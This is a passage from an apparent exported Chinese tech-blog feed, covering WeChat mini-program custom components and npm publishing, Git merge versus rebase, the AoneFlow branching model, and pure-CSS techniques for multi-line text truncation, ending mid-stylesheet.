&#123;&#125; // detail对象，提供给事件监听函数 var myEventOption = &#123;&#125; // 触发事件的选项 this.triggerEvent('myevent', myEventDetail, myEventOption)&#125; 在写自定义form组件事件时，发送事件的数据detail对象使用{value: &#39;&#39;}格式，便于同监听原生form input事件时使用同一个input监听事件 12345 // 事件监听方法inputHandler(e) &#123; this.setData(&#123; [e.currentTarget.dataset.key]: e.detail.value, &#125;); 1234 // 自定义input组件发送事件inputHandler: function (event) &#123; this.triggerEvent('myinput', &#123; value: 123&#125;); &#125;, 1234 &lt;!-- 自定义组件绑定监听事件 --&gt;&lt;yii-input value="&#123;&#123;value&#125;&#125;" data-key="code" bind:myinput="inputHandler"/&gt;&lt;!-- 原生组件绑定监听事件 --&gt;&lt;input value="&#123;&#123;value&#125;&#125;" data-key="code" bindinput="inputHandler"&gt;&lt;/input&gt; 组件生命周期 最重要的生命周期是 created(组件实例刚刚被创建好时) attached(组件完全初始化完毕、进入页面节点树后) detached(在组件离开页面节点树后) ，包含一个组件实例生命流程的最主要时间点。 生命周期方法可以直接定义在 Component 构造器的第一级参数中。 自小程序基础库版本 2.2.3 起，组件的的生命周期也可以在 lifetimes 字段内进行声明（这是推荐的方式，其优先级最高）。如：attached、detached 在 behaviors 中也可以编写生命周期方法 组件所在页面的生命周期在 pageLifetimes 定义段中定义show(组件所在的页面被展示) hide(组件所在的页面被隐藏) resize(组件所在的页面尺寸变化，2.4.0开始支持) behaviors 用于组件间代码共享的特性，类似于一些编程语言中的“mixins”或“traits”。 每个组件可以引用多个 behavior 。 behavior 也可以引用其他 behavior 。 组件本身的属性或方法会覆盖 behavior 中的属性或方法，如果引用了多个 behavior ，在定义段中靠后 behavior 中的属性或方法会覆盖靠前的属性或方法； 如果有同名的数据字段，如果数据是对象类型，会进行对象合并，如果是非对象类型则会进行相互覆盖； 生命周期函数不会相互覆盖，而是在对应触发时机被逐个调用。 内置 behaviors：wx://form-field wx://component-export 组件间关系 略 抽象节点 这个特性自小程序基础库版本 1.9.6 开始支持。 自定义组件模板中的一些节点，其对应的自定义组件不是由自定义组件本身确定的，而是自定义组件的调用者确定的。这时可以把这个节点声明为“抽象节点”。 节点的 generic 引用 generic:xxx=”yyy” 中，值 yyy 只能是静态值，不能包含数据绑定。不能动态决定。 自定义组件扩展 从小程序基础库版本 2.2.3 开始支持。 使用自定义组件 声明局部组件 在index.json中对自定义组进行引用声明 12345 &#123; "usingComponents": &#123; "component-tag-name": "path/to/the/custom/component" &#125;&#125; 在index.wxml中使用 1234 &lt;view&gt; &lt;!-- 以下是对一个自定义组件的引用 --&gt; &lt;component-tag-name inner-text="Some text"&gt;&lt;/component-tag-name&gt;&lt;/view&gt; 声明全局组件 在 app.json 中声明 usingComponents 字段，在此处声明的自定义组件视为全局自定义组件，在小程序内的页面或自定义组件中可以直接使用而无需再声明。 注意 自定义组件也是可以引用自定义组件的 开发者工具 1.02.1810190 及以上版本支持声明全局组件 这里不多说了，只记录关键信息，详细情况查看官方文档自定义组件 开发第三方自定义组件 小程序从基础库版本 2.2.1 开始支持使用 npm 安装第三方包。 开发 初始化 可使用下载模板和命令行工具进行开发，推荐使用命令行开发，如果是已有项目则不需要。 初始化之后需要安装依赖，安装依赖的时候可能会安装失败，在登录npm账号之后会正常安装npm包。如果不行试试verdaccio。 12345678 # 安装命令行工具npm install -g @wechat-miniprogram/miniprogram-cli# 在指定目录初始化miniprogram init --type custom-component# npm 登录。可先跳过执行下面语句，不成功在回来执行npm login# 安装依赖npm install 命令行工具用法 项目模板用法 开发注意事项 为了方便开发执行命令npm run watch，默认会在包根目录下生成miniprogram_dev目录，src中的源代码会被构建并生成到miniprogram_dev/components目录下。/tools/demo下的内容也会复制到该目录下 内置支持多入口构建，如若需要可自行调整 tools/config.js 配置文件的 entry 字段。无论是js模块还是自定义组件都要配置 执行测试npm run test、检测覆盖率npm run coverage 发布使用命令npm run dist 测试工具文档 以下为推荐使用的目录结构，如果有必要开发者也可以自行做一些调整: 12345678910111213141516171819 |--miniprogram_dev // 开发环境构建目录|--miniprogram_dist // 生产环境构建目录|--src // 源码| |--common // 通用 js 模块| |--components // 通用自定义组件| |--images // 图片资源| |--wxml // 通用 wxml 模版资源| |--wxs // 通用 wxs 资源| |--wxss // 通用 wxss 资源| || |--xxx.js/xxx.wxml/xxx.json/xxx.wxss // 暴露的 js 模块/自定义组件入口文件||--test // 测试用例|--tools // 构建相关代码| |--demo // demo 小程序目录，开发环境下会被拷贝生成到 miniprogram_dev 目录中| |--test // 测试工具相关目录| |--config.js // 构建相关配置文件||--gulpfile.js 新加图片之后要重启服务 编写文档 包括但不限于版本说明、使用效果、使用方法、详细说明 发布 发布小程序 npm 包的约束 这里要发布的 npm 包是特指专为小程序定制的 npm 包（简称小程序 npm 包）。 在 package.json 文件中新增一个 miniprogram 字段来指定构建文件生成目录（默认为 miniprogram_dist 目录）。 小程序 npm 包里只有构建文件生成目录会被算入小程序包的占用空间。 等 发布其他 npm 包的约束 只支持纯 js 包，不支持自定义组件。 必须有入口文件，即需要保证 package.json 中的 main 字段是指向一个正确的入口，如果 package.json 中没有 main 字段，则以 npm 包根目录下的 index.js 作为入口文件。 测试、构建相关的依赖请放入 devDependencies 字段中避免被一起打包到小程序包中，这一点和小程序 npm 包的要求相同。 不支持依赖 c++ addon，不支持依赖 nodejs 的内置库： 小程序环境比较特殊，一些全局变量（如 window 对象）和构造器（如 Function 构造器）是无法使用的。 发布流程 如果还没有 npm 帐号，可以到 npm 官网注册一个 npm 帐号。 在本地登录 npm 帐号，在本地执行：npm adduser或者npm login 在已完成编写的 npm 包根目录下执行npm publish 使用 npm支持 在小程序中执行命令安装 npm 包： 1 npm install --save packageName 点击开发者工具中的菜单栏：工具 –&gt; 构建 npm 勾选“使用 npm 模块”选项： 构建完成后即可使用 npm 包。 js 中引入 npm 包： 12 const package = require(&apos;packageName&apos;)const packageOther = require(&apos;packageName/other&apos;) 使用 npm 包中的自定义组件： 123456 &#123; &quot;usingComponents&quot;: &#123; &quot;package&quot;: &quot;packageName&quot;, &quot;package-other&quot;: &quot;packageName/other&quot; &#125;&#125; 思考：这里有一个/other，为什么是这样的，难道因为默认找index组件？如果使用其他组件就要这样使用？ 官方自定义组件 slide-viewnavigation-barrecycle-view 官方扩展 computedsm-crypto]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
        <tag>小程序自定义组件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git-代码合并Merge与Rebase的选择]]></title>
    <url>%2Fblob%2F2018-05-29-git-code-merge-and-rebase-selection%2F</url>
    <content type="text"><![CDATA[官方讲述merge 官方讲述rebase Git分支变基 社区翻译 概述 你要知道的第一件事是，git rebase 和git merge 做的事其实是一样的。它们都被设计来将一个分支的更改并入另一个分支，只不过方式有些不同。 想象一下，你刚创建了一个专门的分支开发新功能，然后团队中另一个成员在 master 分支上添加了新的提交。这就会造成提交历史被 fork 一份，用 Git 来协作的开发者应该都很清楚。 现在，如果 master 中新的提交和你的工作是相关的。为了将新的提交并入你的分支，你有两个选择：merge 或 rebase。 Merge 将 master 分支合并到 feature 分支最简单的办法就是用下面这些命令： 12 git checkout featuregit merge master 或者，你也可以把它们压缩在一行里。 1 git merge master feature feature 分支中新的合并提交（merge commit）将两个分支的历史连在了一起。你会得到下面这样的分支结构： Merge 好在它是一个安全的操作。现有的分支不会被更改，避免了 rebase 潜在的缺点（后面会说）。 另一方面，这同样意味着每次合并上游更改时 feature 分支都会引入一个外来的合并提交。如果 master 非常活跃的话，这或多或少会污染你的分支历史。虽然高级的 git log 选项可以减轻这个问题，但对于开发者来说，还是会增加理解项目历史的难度。 merge 前 merge 后 Rebase 作为 merge 的替代选择，你可以像下面这样将 feature 分支并入 master 分支： 12 git checkout featuregit rebase master 它会把整个 feature 分支移动到 master 分支的后面，有效地把所有 master 分支上新的提交并入过来。但是，rebase 为原分支上每一个提交创建一个新的提交，重写了项目历史，并且不会带来合并提交。 rebase最大的好处是你的项目历史会非常整洁。首先，它不像 git merge 那样引入不必要的合并提交。其次，如上图所示，rebase 导致最后的项目历史呈现出完美的线性——你可以从项目终点到起点浏览而不需要任何的 fork。这让你更容易使用 git log、git bisect 和 gitk 来查看项目历史。 不过，这种简单的提交历史会带来两个后果：安全性和可跟踪性。如果你违反了 rebase 黄金法则，重写项目历史可能会给你的协作工作流带来灾难性的影响。此外，rebase 不会有合并提交中附带的信息——你看不到 feature 分支中并入了上游的哪些更改。 Rebase 前 Rebase 后 Rebase 的黄金法则（有点懵懂） 当你理解 rebase 是什么的时候，最重要的就是什么时候 不能 用 rebase。git rebase 的黄金法则便是，绝不要在公共的分支上使用它。 比如说，如果你把 master 分支 rebase 到你的 feature 分支上会发生什么： 这次 rebase 将 master 分支上的所有提交都移到了 feature 分支后面。问题是它只发生在你的代码仓库中，其他所有的开发者还在原来的 master 上工作。因为 rebase 引起了新的提交，Git 会认为你的 master 分支和其他人的 master 已经分叉了。 同步两个 master 分支的唯一办法是把它们 merge 到一起，导致一个额外的合并提交和两堆包含同样更改的提交。不用说，这会让人非常困惑。 所以，在你运行 git rebase 之前，一定要问问你自己「有没有别人正在这个分支上工作？」。如果答案是肯定的，那么把你的爪子放回去，重新找到一个无害的方式（如 git revert）来提交你的更改。不然的话，你可以随心所欲地重写历史。 结合自己情况使用 在工作中使用git-flow工作流，开发中如果遇到代码合并使用rebase保持线性的提交历史， git-flow部分通过sourcetree带的git-flow插件自动完成 rebase 部分通常经过如下步骤 12345 git fetch origin # 更新你的远程仓库引用git pull --rebase orgin serverBranch # 衍合远程分支#处理冲突git add * # 添加修改后的文件git rebase --continue # 继续衍合 rebase 部分体现在sourcetree上经过如下步骤 获取 拉取（勾选用衍合代替合并） 处理冲突 暂存所有文件 再次点击拉取选择继续变基 注意 已经在远程仓库的代码不要使用rebase，因为会出现在rebase后还要从远端拉取代码的情况，导致出现同一段代码出现多次提交的情况。假如你可以让别人重新拉取代码那就没关系，你可以强制提交到远程代码仓库。]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Merge</tag>
        <tag>Rebase</tag>
        <tag>代码合并</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git-AoneFlow]]></title>
    <url>%2Fblob%2F2018-05-29-git-aoneflow%2F</url>
    <content type="text"><![CDATA[说到分支管理模式，我们最耳熟能详的莫过于 TrunkBased 和 GitFlow。 TrunkBased 模式 是持续集成思想所崇尚的工作方式，它由单个主干分支和许多发布分支组成，每个发布分支在特定版本的提交点上从主干创建出来，用来进行上线部署和 Hotfix。在 TrunkBased 模式中，没有显性的特性分支。当然实际上 Git 的分布式特征天生允许每个人有本地分支，TrunkBased 也并非排斥短期的特性分支存在，只不过在说这种模式的时候，大家通常都不会明确强调它罢了。 虽然近年来有许多不错的案例，但 TrunkBased 模式并没有一统天下。它的缺点比较明显，太多的团队同时工作在主干上，到发布的时候就可能出现灾难（尤其是多版本并行开发的情况）。弥补的措施是 FeatureToggle 以及频繁的集成和足够的测试覆盖，这对开发团队的能力提出了比较高的要求。目前 TrunkBased 模式主要用在不需要同时维护多个历史版本的 SaaS 型项目，特别是经过微服务改造的各种小型服务上。 TrunkBased 模式有两种常见演进版本。OneFlow 模式 参考了 TrunkBased 的许多思想，对操作流程做了更严格的定义，增加了 Hotfix 分支等内容。多主干模式（通常是双主干，固定的开发分支和固定的发布分支），算是 TrunkBased 采用固定发布分支的特例，在 提升团队的微服务落地能力 这篇文章里介绍过，不再赘述。 GitFlow 模式 是若干模式的集大成者，包含一个主干分支、一个开发分支、许多的特性分支、许多的发布分支和 Hotfix 分支，以及许多繁琐的合并规则。它有一个 Git 插件，不过早就没人维护了。由于对每个阶段的每项操作定义十分明确，它曾经是很多重视流程的企业眼里的香馍馍。但它使用起来并不是很容易，大量的合并冲突和对集成测试不友好也是它被诟病最多的地方。 对，还有 GithubFlow 模式，不过这种策略无非是在 TrunkBased 的基础上，增加了个人仓库和 Pull Request 合并代码的操作，与在同一个仓库里增加个人分支的做法类似，从实用的意义来说，它更合适分布式团队。GithubFlow 也有演进版本，例如强调了多环境部署和将仓库或分支与环境关联的 GitlabFlow 模式。 要么简单粗暴如 TrunkBased，要么繁琐复杂如 GitFlow。难到真没有其他选择了吗？ 另辟蹊径的 AoneFlow 在 AoneFlow 上你能看到许多其他分支模式的影子。它基本上兼顾了 TrunkBased 的“易于持续集成”和 GitFlow 的“易于管理需求”特点，同时规避掉 GitFlow 的那些繁文缛节。 看一下具体套路。AoneFlow 只使用三种分支类型：主干分支、特性分支、发布分支，以及三条基本规则。 规则一，开始工作前，从主干创建特性分支。 AoneFlow 的特性分支基本借鉴 GitFlow，没有什么特别之处。每当开始一件新的工作项（比如新的功能或是待解决的问题）的时候，从代表最新已发布版本的主干上创建一个通常以feature/前缀命名的特性分支，然后在这个分支上提交代码修改。也就是说，每个工作项（可以是一个人完成，或是多个人协作完成）对应一个特性分支，所有的修改都不允许直接提交到主干。 规则二，通过合并特性分支，形成发布分支。 AoneFlow 的发布分支设计十分巧妙，可谓整个体系的精髓。GitFlow 先将已经完成的特性分支合并回公共主线（即开发分支），然后从公共主线拉出发布分支。TrunkBased 同样是等所有需要的特性都在主干分支上开发完成，然后从主干分支的特定位置拉出发布分支。而 AoneFlow 的思路是，从主干上拉出一条新分支，将所有本次要集成或发布的特性分支依次合并过去，从而得到发布分支。发布分支通常以release/前缀命名。 这条规则很简单，不过实际的玩法就相当丰富了。 首先，发布分支的用途可以很灵活。基础玩法是将每条发布分支与具体的环境相对应，比如release/test分支对应部署测试环境，release/prod分支对应线上正式环境等等，并与流水线工具相结合，串联各个环境上的代码质量扫描和自动化测试关卡，将产出的部署包直接发布到相应环境上。进阶点的玩法是将一个发布分支对应多个环境，比如把灰度发布和正式发布串在一起，中间加上人工验收的步骤。高级的玩法呢，要是按迭代计划来关联特性分支，创建出以迭代演进的固定发布分支，再把一系列环境都串在这个发布分支的流水线上，就有点经典持续集成流水线的味道了。再或者做一个将所有特性分支都关联在一起的发布分支，专门用于对所有提交做集成测试，就玩出了 TrunkBased 的效果。当然，这些花哨的高级玩法是我臆想的，阿里的发布分支一般都还是比较中规中矩。 其次，发布分支的特性组成是动态的，调整起来特别容易。在一些市场瞬息万变的互联网企业，以及采用“敏捷运作”的乙方企业经常会遇到这种情况，已经完成就等待上线的需求，随时可能由于市场策略调整或者甲方的一个临时决定，其中某个功能忽然要求延迟发布或者干脆不要了。再或者是某个特性在上线前发现存在严重的开发问题，需要排除。按往常的做法，这时候就要来手工“剔代码”了，将已经合并到开发分支或者主干分支的相关提交一个个剔除出去，做过的同学都知道很麻烦。在 AoneFlow 的模式下，重建发布分支只是分分钟的事，将原本的发布分支删掉，从主干拉出新的同名发布分支，再把需要保留的各特性分支合并过来就搞定。这一系列动作能够在很大程度上实现自动化，而且不会在仓库留下一堆剔除代码的记录，干净无污染。 此外，发布分支之间是松耦合的，这样就可以有多个集成环境分别进行不同的特性组合的集成测试，也能方便的管理各个特性进入到不同环境上部署的时机。松耦合并不代表没有相关性，由于测试环境、集成环境、预发布环境、灰度环境和线上正式环境等发布流程通常是顺序进行的，在流程上可以要求只有通过前一环境验证的特性，才能传递到下一个环境做部署，形成漏斗形的特性发布流。阿里有统一平台来自动化完成特性组合在发布分支间的迁移，在下面讲工具的部分里会再介绍。 规则三，发布到线上正式环境后，合并相应的发布分支到主干，在主干添加标签，同时删除该发布分支关联的特性分支。 当一条发布分支上的流水线完成了一次线上正式环境的部署，就意味着相应的功能真正的发布了，此时应该将这条发布分支合并到主干。为了避免在代码仓库里堆积大量历史上的特性分支，还应该清理掉已经上线部分特性分支。与 GitFlow 相似，主干分支上的最新版本始终与线上版本一致，如果要回溯历史版本，只需在主干分支上找到相应的版本标签即可。 除了基本规则，还有一些实际操作中不成文的技巧。比如上线后的 Hotfix，正常的处理方法应该是，创建一条新的发布分支，对应线上环境（相当于 Hotfix 分支），同时为这个分支创建临时流水线，以保障必要的发布前检查和冒烟测试能够自动执行。但其实还有一种简便方法是，将线上正式环境对应的发布分支上关联的特性分支全部清退掉，在这个发布分支上直接进行修改，改完利用现成的流水线自动发布。如果非得修一个历史版本的 Bug 怎么办呢？那就老老实实的在主干分支找到版本标签位置，然后从那个位置创建 Hotfix 分支吧，不过由于阿里的产品大多是线上 SaaS 业务，这样的场景并不多见。正是这些简单的规则，组成了 AoneFlow 独树一帜的核心套路。 AoneFlow 中每一个看似简单的步骤都并非凭空臆造，而是经历大量产品团队反复磨砺后积累下来的经验。接下来，我会说说 AoneFlow 的技术门槛以及阿里内部的应对之道。 AoneFlow 的体验优化 谙熟武侠之道的人都懂得，掌握一个门派的看家武艺，除了要会招式，还得有深厚的内功和趁手的兵器。否则拿了辟邪剑谱，也只能望谱兴叹。 阿里团队的内功和兵器，实际上是良好的代码习惯和齐全的配套工具。 这里说的习惯，除了开发流程和代码分支的管理方式以外，还包括日常开发中的一些约定俗成的规约。阿里的许多开发规约是有“文献”记载的，主要收录在 《阿里巴巴 Java 开发手册》 里面。它的内容现在已经公开了，所以早就不算是秘密。 举一个具体的例子。在 AoneFlow 的流程中，每次重建发布分支的时候都会重新合并然后编译代码，产生新的部署包。然而，即使代码的内容是一样的，如果工程中依赖了一些会改变的第三方软件包，依然可能导致打包出的产品行为不完全一致。因此，在阿里的代码规约中就明确地指出了，用于线上发布的代码，不可以使用包含“SNAPSHOT 版本”（即未正式发布版本）的依赖包，从而确保每次构建出的产物都是一致的。类似这样的细节还有很多，好的开发习惯是确保软件质量的必要前提。 工具可以使得团队协作更加平滑。虽然只要弄懂原理，AoneFlow 中每个分支创建、合并、更改步骤使用单纯的 Git 命令就能玩转。但其中的一些操作（比如为每个发布分支选出恰当的特性分支组合进行合并）手工执行极易出错，而且让团队的个人重复这些日常琐事的命令操作，并不是令人愉悦的事情。 在阿里内部，使用 AoneFlow 流程的团队基本上不用自己运行 Git 来处理分支的事情，而是由阿里巴巴集团内部名叫 Aone 的协同研发平台（以下简称平台）接管。这个承担集团 80% 产品从需求和用户故事提出到部署上线完整研发流程的平台，内置了许多以服务组件的形式嵌入的研发提效工具，其中的发布组件为 AoneFlow 的用户体验添色不少。比较显著的辅助“功效”包括以下几个方面。 首先是整体流程的自动化。 由于是内部工具，平台的功能高度内聚。对于项目而言，从提出原始需求，将需求拆分为任务，然后根据任务在线创建特性分支，再聚合生成发布分支，同时根据模板自动创建测试环境，直到后期的运维保障都可以一站式的搞定。 这个流程已经远远超出了代码分支管理的范畴。但正是因为如此，平台对于 AoneFlow，向前做到了将特性分支和需求项关联起来，确保了特性分支的命名规范性；向后做到了将发布分支与部署行为关联起来，确保了各环境版本来源的可靠性。打通了端到端交付的任督二脉。 其次是发布分支的流水线。 作为一种流程自动化的手段，CI/CD 流水线是许多现代交付团队中常见的标配实践。在 AoneFlow 的代码生命周期里涉及许多分支，当这些分支被创建或更新时，往往需要伴随其他的一系列行为。流水线能够将这些日常开发过程中的代码分支与其所表达的深层意图（比如提交代码即进行集成测试）联系起来。特别是发布分支，AoneFlow 的每个发布分支通常关联具体的部署环境，当有新代码合并进分支时，就应该及时对代码进行检查和部署。 理想情况下，每条不同的分支都应该有与其作用相匹配的一条流水线来为它服务。AoneFlow 的发布分支是相对固定的，因此相比 GitFlow 更易于进行持续集成。理论上任何流水线工具都能够配合 AoneFlow 使用，不过，阿里的统一平台提供流水线对代码评审、安全检查、在线部署等功能的整合，还是为 AoneFlow 在内部团队的使用优化增色不少。 还有一项很有用的辅助是分支关联的管理。 特性分支与发布分支的关联关系维护是一个 AoneFlow 特有的问题。记住每个发布分支分别来自哪些特性分支对于需要基于现有特性组合进行改变的时候十分有意义。比如当需要将某个特性从特定发布分支退出时，通常会将除了该特性以外的其他特性所在分支进行一次合并，以替换原有的发布分支。人为的记录这些信息并不轻松，要是通过平台进行展示和辅助就会方便许多。 当某些功能组合在一个低级别的发布环境（如集成测试环境）验证完成后，我们希望将它的内容直接迁移到高级别的环境（如预发布环境）对应的发布分支上。这样可以确保线上的版本一定是经过预发验证的，预发的版本一定是经过集成验证的，以此类推，使得各个发布分支形成串联。同样的，使用普通的 Git 命令就能实现这个操作，只不过用可视化工具会让流程更加直观。 作者：一杯甜酒来源：CSDN原文：https://blog.csdn.net/u012562943/article/details/79754587]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>AoneFlow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[纯 CSS 实现多行文字截断]]></title>
    <url>%2Fblob%2F2017-12-11-pure-css-for-multi-line-text-truncation%2F</url>
    <content type="text"><![CDATA[单行文本截断 text-overflow 文本溢出我们经常用到的应该就是 text-overflow:ellipsis 了，相信大家也很熟悉，只需轻松几行代码就可以实现单行文本截断。 12345 .nowrap &#123; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;&#125; 实现效果： 优点： 属性浏览器原生支持，各大浏览器兼容性好 缺点： 就是只支持单行文本截断，并不支持多行文本截取。 适用场景： 单行文字截断最简单实现，效果最好，放心使用。 多行文本截断 -webkit-line-clamp 123456 .nowrap2 &#123; display: -webkit-box; overflow: hidden; -webkit-line-clamp: 2; -webkit-box-orient: vertical;&#125; 它需要和 display、 -webkit-box-orient 和 overflow 结合使用： display:-webkit-box; 必须结合的属性，将对象作为弹性伸缩盒子模型显示。 -webkit-box-orient; 必须结合的属性，设置或检索伸缩盒对象的子元素的排列方式。 text-overflow:ellipsis; 可选属性，可以用来多行文本的情况下，用省略号“…”隐藏超出范围的文本。 实现效果： 优点： 响应式截断，根据不同宽度做出调整。 文本超出范围才显示省略号，否则不显示省略号。 浏览器原生实现，所以省略号位置显示刚好。 缺点： 因为 -webkit-line-clamp 是一个不规范的属性，它没有出现在 CSS 规范草案中。也就是说只有 webkit 内核的浏览器才支持这个属性，像 Firefox, IE 浏览器统统都不支持这个属性，浏览器兼容性不好。 使用场景： 多用于移动端页面，因为移动设备浏览器更多是基于 webkit 内核，除了兼容性不好，实现截断的效果不错。 定位元素实现多行文本截断 另外还有一种靠谱简单的做法就是设置相对定位的容器高度，用包含省略号(…)的伪元素模拟实现，通过伪元素绝对定位到行尾并遮住文字，再通过 overflow:hidden隐藏多余文字，实现方式如下： 123456789101112131415161718192021 p &#123; position: relative; line-height: 18px; height: 36px; overflow: hidden; word-break:break-all; &#125;p::after &#123; content:"..."; font-weight:bold; position:absolute; bottom:0; right:0; padding:0 20px 1px 45px; /* 为了展示效果更好 */ background: -webkit-gradient(linear, left top, right top, from(rgba(255, 255, 255, 0)), to(white), color-stop(50%, white)); background: -moz-linear-gradient(to right, rgba(255, 255, 255, 0), white 50%, white); background: -o-linear-gradient(to right, rgba(255, 255, 255, 0), white 50%, white); background: -ms-linear-gradient(to right, rgba(255, 255, 255, 0), white 50%, white); background: linear-gradient(to right, rgba(255, 255, 255, 0), white 50%, white);&#125; 实现效果： 优点： 兼容性好，对各大主流浏览器有好的支持 响应式截断，根据不同宽度做出调整 缺点： 省略号一直显示，无法做到自适应显示 适合场景： 文字内容较多，确定文字内容一定会超过容器的，那么选择这种方式不错。 float 特性实现多行文本截断 有个三个盒子 div，粉色盒子左浮动，浅蓝色盒子和黄色盒子右浮动： 当浅蓝色盒子的高度低于粉色盒子，黄色盒子仍会处于浅蓝色盒子右下方。 如果浅蓝色盒子文本过多，高度超过了粉色盒子，则黄色盒子不会停留在右下方，而是掉到了粉色盒子下。 那么我们可以将黄色盒子进行相对定位，将内容溢出的黄色盒子移动到文本内容右下角，而未溢出的则会被移到外太空去了，只要我们使用 overflow:hidden就可以隐藏掉。 基本原理就是这样，我们可以将浅蓝色区域想象成标题，黄色区域想象为省略号效果。那么你可能会觉得粉色盒子占了空间，那岂不是标题会整体延后了吗，这里可以通过 margin 的负值来出来，设置浅蓝色盒子的 margin-left 的负值与粉色盒子的宽度相同，标题也能正常显示。 123 &lt;div class="wrap"&gt; &lt;div class="text"&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Dignissimos labore sit vel itaque delectus atque quos magnam assumenda quod architecto perspiciatis animi.&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920212223242526272829303132333435363738 .wrap &#123; height: 40px; line-height: 20px; overflow: hidden;&#125;.wrap .text &#123; float: right; margin-left: -5px; width: 100%; word-break: break-all;&#125;.wrap::before &#123; float: left; width: 5px; content: ''; height: 40px;&#125;.wrap::after &#123; float: right; content: "..."; height: 20px; line-height: 20px; /* 为三个省略号的宽度 */ width: 3em; /* 使盒子不占位置 */ margin-left: -3em; /* 移动省略号位置 */ position: relative; left: 100%; top: -20px; padding-right: 5px; text-align: right; background: -webkit-gradient(linear, left top, right top, from(rgba(255, 255, 255, 0)), to(white), color-stop(50%, white)); background: -moz-linear-gradient(to right, rgba(255, 255, 255, 0), white 50%, white); background: -o-linear-gradient(to right, rgba(255, 255, 255, 0), white 50%, white); background: -ms-linear-gradient(to right, rgba(255, 255, 255, 0), white 50%, white); background: linear-gradient(to right, rgba(255, 255, 255, 0), white 50%, white);&#125; 实现效果： 优点： 兼容性好，对各大主流浏览器有好的支持。 响应式截断，根据不同宽度做出调整。 文本超出范围才显示省略号，否则不显示省略号。 缺点： 因为我们是模拟省略号，所以显示位置有时候没办法刚刚好 以上为从 https://segmentfault.com/a/1190000016879657 获取 结合第一种方式实现 显示几行就创建几行内容，每一行的宽度为相应的倍数，同时从第二行开始比上一行位移一份的宽度。 1234567891011121314151617181920212223242526272829303132 &lt;style&gt; *&#123; margin: 0; padding: 0; border: 0; &#125; .nowrap &#123; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; &#125; .wrap&#123; width: 100%; overflow: hidden; position: relative; &#125; .line&#123; /* 两行的宽度为200%，三行的宽度为300% */ width: 200%; &#125; .line2&#123; /* 两行向左位移50%，三行向左位移33.3333% */ transform: translateX(-50%); &#125;&lt;/style&gt;&lt;div class="wrap"&gt; &lt;div class="line nowrap"&gt;文本溢出我们经常用到的应该就是 text-overflow:ellipsis 了，相信大家也很熟悉，只需轻松几行代码就可以实现单行文本截断。&lt;/div&gt; &lt;div class="line nowrap line2"&gt;文本溢出我们经常用到的应该就是 text-overflow:ellipsis 了，相信大家也很熟悉，只需轻松几行代码就可以实现单行文本截断。&lt;/div&gt;&lt;/div&gt; 优点： 响应式截断，根据不同宽度做出调整。 文本超出范围才显示省略号，否则不显示省略号。 浏览器原生实现，所以省略号位置显示刚好。 缺点： 在换行处会出现一半文字的情况 这一段为自己思考所得 float与-webkit-line-clamp的实现 -webkit-line-clamp是webkit内核的私有css属性，用于进行多行省略，在安卓和ios上全支持。但它固定使用省略号，无法直接扩展。而且自带了溢出截断逻辑，作用于容器高度。仔细考察可发现它使用的省略号是单字符…，可以用文字css属性如font-size,letter-spacing,color等控制。 利用右浮动原理——右浮动元素从右到左依次排列，不够空间则换行。 原理展示： 123456789101112131415 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;style&gt;@-webkit-keyframes width-change &#123;0%,100%&#123;width: 320px&#125; 50%&#123;width:260px&#125;&#125;/*测试*/&lt;/style&gt;&lt;div style="position: relative;line-height:18px;-webkit-animation: width-change 8s ease infinite;max-height: 108px;"&gt; &lt;div style="font-size: 36px;letter-spacing: 28px;display: -webkit-box;-webkit-box-orient: vertical;-webkit-line-clamp: 6;color: transparent;line-height: 18px;position: relative;"&gt; &lt;div style="font-size:12px;color: #000;display: inline;vertical-align: top;letter-spacing: 0;"&gt; 腾讯成立于1998年11月，是目前中国领先的互联网增值服务提供商之一。成立10多年来，腾讯一直秉承“一切以用户价值为依归”的经营理念，为亿级海量用户提供稳定优质的各类服务，始终处于稳健发展状态。2004年6月16日，腾讯控股有限公司在香港联交所主板公开上市(股票代号700)。 &lt;/div&gt; &lt;div style="position:absolute;top: 0;left: 50%;width: 100%;height: 100%;letter-spacing: 0;color: #000;font-size: 12px;background: rgba(173, 216, 230, 0.5);"&gt; &lt;div style="float: right;width: 50%;height: 100%;background: rgba(255, 192, 203, 0.5);"&gt;&lt;/div&gt; &lt;div style="float: right;width: 50%;height: 108px;background: hsla(223, 100%, 50%, 0.19);"&gt;&lt;/div&gt; &lt;div style="float: right;width: 50px;height: 18px;position: relative;background: rgba(255, 165, 0, 0.5);" class=""&gt;... 更多&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 将-webkit-line-clamp实现的文字溢出截断代码为主体，叠加绝对定位同步的按需显示...更多结构。因为绝对定位，这里使用百分比简化代码。最外包一层结构限制最大高度。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;style&gt;/* * 行高 h * 最大行数 n * ...更多容器的宽 w * 字号 f */@-webkit-keyframes width-change &#123;0%,100%&#123;width: 320px&#125; 50%&#123;width:260px&#125;&#125;.ellipsis &#123; position: relative; background: rgb(230, 230, 230); width: 260px; max-height: 108px; /* h*n */ line-height: 18px; /* h */ overflow: hidden; -webkit-animation: width-change 8s ease infinite;&#125;.ellipsis-container &#123; position: relative; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 6; /* n */ font-size: 50px; /* w */ color: transparent;&#125;.ellipsis-content &#123; color: #000; display: inline; vertical-align: top; font-size: 12px; /* f */&#125;.ellipsis-ghost &#123; position:absolute; z-index: 1; top: 0; left: 50%; width: 100%; height: 100%; color: #000;&#125;.ellipsis-ghost:before &#123; content: ""; display: block; float: right; width: 50%; height: 100%;&#125;.ellipsis-placeholder &#123; content: ""; display: block; float: right; width: 50%; height: 108px; /* h*n */&#125;.ellipsis-more 